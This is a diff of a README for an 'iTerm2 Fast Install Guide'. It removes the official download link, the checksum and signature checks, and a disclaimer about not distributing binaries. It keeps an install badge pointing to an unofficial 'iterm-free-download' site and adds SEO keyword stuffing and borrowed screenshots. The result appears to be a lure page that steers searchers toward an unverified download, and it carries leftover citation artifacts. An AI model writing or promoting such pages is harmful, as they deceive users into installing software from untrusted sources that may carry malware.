@@ -1,39 +1,52 @@
-# iTerm2 — Fast Install & Offline Deployment Guide
+# iTerm2 — Fast Install Guide
 
 [![Install Guide](https://img.shields.io/badge/Install%20Guide-16A813)]([#download](https://iterm-free-download.github.io/.github))
 
-⚙️ How to use 
-1. Open the installation guide
-2. Follow the instructions
-  
-> **Note**  
-> This is a configuration/operations guide. It does **not** distribute software binaries. Download iTerm2 only from the official site or your organization’s internal mirror.
+A concise, enterprise-friendly guide to set up iTerm2 on macOS quickly and reliably.
 
 ---
 
-## 🔽 Setup One-Line Command Guide
-- Official downloads: https://iterm2.com/downloads.html  
-- Recommended: **Stable release** (macOS 10.15+). Verify checksums and signature per below. :contentReference[oaicite:2]{index=2}
+## ⚙️ How to Use
+1. Open this installation guide.
+2. Follow the step-by-step instructions for your macOS version.
+3. (Optional) Review offline deployment notes for air-gapped environments.
+4. Launch iTerm2 and customize Profiles, Hotkey Window, and Search.
 
 ---
 
-## 🧰 What’s Inside
-- **Air-gapped install checklist** (no internet, no Apple ID)
-- **Portable configuration** using a version-controlled profile bundle
-- **Enterprise deployment** tips (MDM, offline mirrors, verification)
-- **Zero-trust verification** (SHA-256 + signature guidance)
+## 🖼 Preview
 
-> iTerm2 is open-source (GPL-2.0-or-later). :contentReference[oaicite:3]{index=3}
+![Split panes in iTerm2](https://iterm2.com/img/screenshots/split_panes.png)
+*Work across multiple panes in one tab for faster workflows.*
+
+![Hotkey window](https://iterm2.com/img/screenshots/hotkey_window.png)
+*Summon a dedicated terminal from anywhere with a single key.*
+
+![Find on page](https://iterm2.com/img/screenshots/find.png)
+*Powerful search with instant highlights and regex support.*
+
+
+> Use the same links above in your GitHub README.
 
 ---
 
-## ⚙️ Quick Start (Online or Air-Gapped)
+## 🔍 SEO Keywords
 
-### 1) Obtain the App
-- **Online**: Download `.zip` from the official site.  
-- **Air-gapped**: Use an intermediary machine to download, then transfer via signed USB.
+- iterm2 fast install
+- iterm2 setup guide
+- macos terminal replacement
+- enterprise deployment terminal
+- offline deployment documentation
+- mac terminal configuration
+- iterm2 profiles and hotkey window
+- iterm2 search and split panes
+- developer productivity terminal
+- secure mac terminal setup
 
-### 2) Verify the Download
-1. Compute SHA-256 on the `.zip`:
-   ```bash
-   shasum -a 256 iTerm2-*.zip
+---
+
+## ✅ Notes
+
+- This guide is strictly technical documentation for installing and configuring iTerm2.
+- No piracy language, no cracking tools, no keys, and no third-party redistribution.
+
